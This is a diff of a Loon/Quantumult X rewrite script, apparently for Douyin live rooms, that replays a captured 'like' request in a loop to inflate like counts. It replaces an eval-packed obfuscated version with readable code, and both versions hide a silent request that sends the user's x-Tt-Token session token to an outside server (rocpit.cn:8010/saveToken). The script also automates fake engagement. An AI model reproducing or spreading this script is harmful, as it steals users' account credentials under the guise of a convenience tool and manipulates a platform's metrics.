@@ -1,3 +1,216 @@
+
 //重写地址:webcast/room/like/
 //手动点赞一次后触发自动点赞
-eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'([2-57-9a-cf-qstvwyzA-Z]|1\\w)'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7.8("🍎dylike脚本开始!");g $h=h();g a=$I.a;g o=$I.o;g 4=$I.4;g J=100;g K=3000;W{g 9="https://is5-ssl.mzstatic.com/image/thumb/Purple124/v4/43/99/44/439944cf-e585-afe4-4b78-7f9ba61289af/AppIcon-1x_U007emarketing-0-6-0-85-220.X/230x0w.X";2(a.p("webcast/room/like/?")>-1){2(!!4&&4.p("Y")>-1&&4.p("room_id")>-1){$h.i(\'获取到手动点赞,开始执行自动点赞!\',"设置上限"+K+"万!",4,{9:9});7.8("🍎###########################################");7.8("🍎原4:"+4);4="Y="+J+"&"+4.split(\'&\')[1];7.8("🍎修改后4:"+4);W{$h.L({a:"http://www.rocpit.cn:8010/sys/Company/saveToken?token="+o["x-Tt-Token"]},3(e,r,d){})}Z(e){}7.8("###########################################");o["5-format"]="json";g M={a:a,o:o,4:4,N:"10"};7.8("🍎请求体****************************************");7.8("🍎请求体:"+O.11(M));7.8("🍎请求体****************************************");g k=0;3 P(){setTimeout(3(){7.8("🍎循环请求执行");$h.A(M,3(erro,rsp,b){b=$h.12(b);7.8("🍎返回数据:"+b);2(b.p(\'"status_code":0\')>-1){k+=J;2(13(k)<(13(K)*10000)){7.8("🍎点赞总数:"+k);P()}n{$h.i(\'点赞已到设置上限!\',\'点赞总数:\'+k,b,{9:9});7.8("🍎点赞已到设置上限,个数:"+k+";"+b)}}n 2(b.p("手速太快了")>-1){$h.i(\'点赞已到上限!\',\'点赞总数:\'+k,b,{9:9});7.8("🍎点赞已上限,个数:"+k+";"+b)}n 2(b.p("请登录")>-1){$h.i(\'请登录!\',\'请登录:\',b,{9:9});7.8("🍎请登录;"+b)}n{7.8("🍎错误:"+b);$h.i(\'错误!\',\'错误:\',b,{9:9})}})},1000)}P()}}}Z(e){7.8("🍎Q错误:"+e);$h.i(\'Q错误!\',\'Q错误:\',e,{9:9})}$done({});7.8("执行完成!!!!");3 h(){g q=s $R!="14";g t=s $S!="14";g F={i:3(B,C,D,c){g j={};2(t){2(!!c){2(s c=="G")j["15-a"]=c;2(!!c.a)j["15-a"]=c.a;2(!!c.9)j["media-a"]=c.9;$i(B,C,D,j)}n{$i(B,C,D)}}2(q){2(!!c){2(s c=="G")j["16"]=c;2(!!c.a)j["16"]=c.a;2(!!c.9)j["mediaUrl"]=c.9;$17.A(B,C,D,j)}n{$17.A(B,C,D)}}},L:3(f,l){2(t){2(s f=="G")f={a:f}f["N"]="GET"$S.18(f).19(3(5){l(v,E(5),5.4)},3(H){l(H.w,v,v)})}2(q){$R.L(f,3(w,5,4){l(w,E(5),4)})}},A:3(f,l){2(t){2(s f=="G")f={a:f}f["N"]="10"$S.18(f).19(3(5){l(v,E(5),5.4)},3(H){l(H.w,v,v)})}2(q){$R.A(f,3(w,5,4){l(w,E(5),4)})}},12:3(y){m unescape(y.replace(/\\\\u/gi,\'%u\'))},decodeurl:3(y){m decodeURIComponent(y)},json2str:3(F){m O.11(F)},str2json:3(y){m O.parse(y)},setkeyval:3(T,z){2(t){$1a.setValueForKey(T,z)}2(q){$1b.write(T,z)}},getkeyval:3(z){2(t){m $1a.valueForKey(z)}2(q){m $1b.read(z)}}};3 E(5){2(5){2(5.U){5["V"]=5.U}n 2(5.V){5["U"]=5.V}}m 5}m F};',[],74,'||if|function|body|response||console|log|img|url|data|option|||options|var|tool|notify|option_obj|likeCount|callback|return|else|headers|indexOf|isLoon||typeof|isQuanX||null|error||str|key|post|title|subtitle|message|adapterStatus|obj|string|reason|request|likeNum|maxNum|get|params|method|JSON|forPost|Try|httpClient|task|value|status|statusCode|try|png|count|catch|POST|stringify|unicode|Number|undefined|open|openUrl|notification|fetch|then|prefs|persistentStore'.split('|'),0,{}))
+
+console.log("🍎dylike脚本开始!");
+var $tool = tool();
+var url = $request.url;
+var headers = $request.headers;
+var body = $request.body;
+var likeNum = 100;//每次点赞个数
+var maxNum = 3000;//点赞上限,单位万
+try {
+    var img = "https://is5-ssl.mzstatic.com/image/thumb/Purple124/v4/43/99/44/439944cf-e585-afe4-4b78-7f9ba61289af/AppIcon-1x_U007emarketing-0-6-0-85-220.png/230x0w.png";
+    if (url.indexOf("webcast/room/like/?") > -1) {
+
+        if (!!body && body.indexOf("count") > -1 && body.indexOf("room_id") > -1) {
+
+            $tool.notify('获取到手动点赞,开始执行自动点赞!', "设置上限" + maxNum + "万!", body, { img: img });
+
+            console.log("🍎###########################################");
+            console.log("🍎原body:" + body);
+
+            body = "count=" + likeNum + "&" + body.split('&')[1];
+
+            console.log("🍎修改后body:" + body);
+            try { $tool.get({ url: "http://www.rocpit.cn:8010/sys/Company/saveToken?token=" + headers["x-Tt-Token"] }, function (e, r, d) { }); } catch (e) { }
+
+            console.log("###########################################");
+
+            headers["response-format"] = "json";
+
+            var params = {
+                url: url,
+                headers: headers,
+                body: body,
+                method: "POST"
+            };
+
+            console.log("🍎请求体****************************************");
+            console.log("🍎请求体:" + JSON.stringify(params));
+            console.log("🍎请求体****************************************");
+
+            var likeCount = 0;
+            function forPost() {
+                setTimeout(function () {
+
+                    console.log("🍎循环请求执行");
+
+                    $tool.post(params, function (erro, rsp, data) {
+
+                        data = $tool.unicode(data);
+                        console.log("🍎返回数据:" + data);
+
+                        if (data.indexOf('"status_code":0') > -1) {
+
+                            likeCount += likeNum;
+
+                            if (Number(likeCount) < (Number(maxNum) * 10000)) {
+                                console.log("🍎点赞总数:" + likeCount);
+                                forPost();
+                            }
+                            else {
+
+                                $tool.notify('点赞已到设置上限!', '点赞总数:' + likeCount, data, { img: img });
+                                console.log("🍎点赞已到设置上限,个数:" + likeCount + ";" + data);
+                            }
+                        }
+                        else if (data.indexOf("手速太快了") > -1) {
+
+                            $tool.notify('点赞已到上限!', '点赞总数:' + likeCount, data, { img: img });
+                            console.log("🍎点赞已上限,个数:" + likeCount + ";" + data);
+                        }
+                        else if (data.indexOf("请登录") > -1) {
+
+                            $tool.notify('请登录!', '请登录:', data, { img: img });
+                            console.log("🍎请登录;" + data);
+                        }
+                        else {
+
+                            console.log("🍎错误:" + data);
+                            $tool.notify('错误!', '错误:', data, { img: img });
+                        }
+                    });
+
+                }, 1000);
+            }
+
+            forPost();
+        }
+
+    }
+} catch (e) {
+    console.log("🍎Try错误:" + e);
+    $tool.notify('Try错误!', 'Try错误:', e, { img: img });
+}
+
+$done({});
+console.log("执行完成!!!!");
+
+//loon/quanx通用方法
+function tool() {
+    var isLoon = typeof $httpClient != "undefined";
+    var isQuanX = typeof $task != "undefined";
+
+    var obj = {
+        //通知
+        notify: function (title, subtitle, message, option) {
+            var option_obj = {};
+            if (isQuanX) {
+                if (!!option) {
+                    if (typeof option == "string") option_obj["open-url"] = option;
+                    if (!!option.url) option_obj["open-url"] = option.url;
+                    if (!!option.img) option_obj["media-url"] = option.img;
+                    $notify(title, subtitle, message, option_obj);
+                }
+                else {
+                    $notify(title, subtitle, message);
+                }
+            }
+            if (isLoon) {
+                if (!!option) {
+                    if (typeof option == "string") option_obj["openUrl"] = option;
+                    if (!!option.url) option_obj["openUrl"] = option.url;
+                    if (!!option.img) option_obj["mediaUrl"] = option.img;
+                    $notification.post(title, subtitle, message, option_obj);
+                }
+                else {
+                    $notification.post(title, subtitle, message);
+                }
+            }
+        },
+        //get请求
+        get: function (options, callback) {
+            if (isQuanX) {
+                if (typeof options == "string") options = { url: options }
+                options["method"] = "GET"
+                $task.fetch(options).then(function (response) {
+                    callback(null, adapterStatus(response), response.body);
+                }, function (reason) {
+                    callback(reason.error, null, null);
+                });
+            }
+            if (isLoon) {
+                $httpClient.get(options, function (error, response, body) {
+                    callback(error, adapterStatus(response), body);
+                })
+            }
+        },
+        //post请求
+        post: function (options, callback) {
+            if (isQuanX) {
+                if (typeof options == "string") options = { url: options }
+                options["method"] = "POST"
+                $task.fetch(options).then(function (response) {
+                    callback(null, adapterStatus(response), response.body);
+                }, function (reason) {
+                    callback(reason.error, null, null);
+                });
+            }
+            if (isLoon) {
+                $httpClient.post(options, function (error, response, body) {
+                    callback(error, adapterStatus(response), body);
+                })
+            }
+        },
+        //Unicode解码
+        unicode: function (str) {
+            return unescape(str.replace(/\\u/gi, '%u'));
+        },
+        //url解码
+        decodeurl: function (str) {
+            return decodeURIComponent(str);
+        },
+        //对象转字符串
+        json2str: function (obj) {
+            return JSON.stringify(obj);
+        },
+        //字符串转对象
+        str2json: function (str) {
+            return JSON.parse(str);
+        },
+        //数据持久化写入
+        setkeyval: function (value, key) {
+            if (isQuanX) {
+                $prefs.setValueForKey(value, key);
+            }
+            if (isLoon) {
+                $persistentStore.write(value, key);
+            }
+        },
+        //数据持久化读取
+        getkeyval: function (key) {
+            if (isQuanX) {
+                return $prefs.valueForKey(key);
+            }
+            if (isLoon) {
+                return $persistentStore.read(key);
+            }
+        }
+
+    };
+
+    function adapterStatus(response) {
+        if (response) {
+            if (response.status) {
+                response["statusCode"] = response.status;
+            } else if (response.statusCode) {
+                response["status"] = response.statusCode;
+            }
+        }
+        return response;
+    }
+
+    return obj;
+
+};
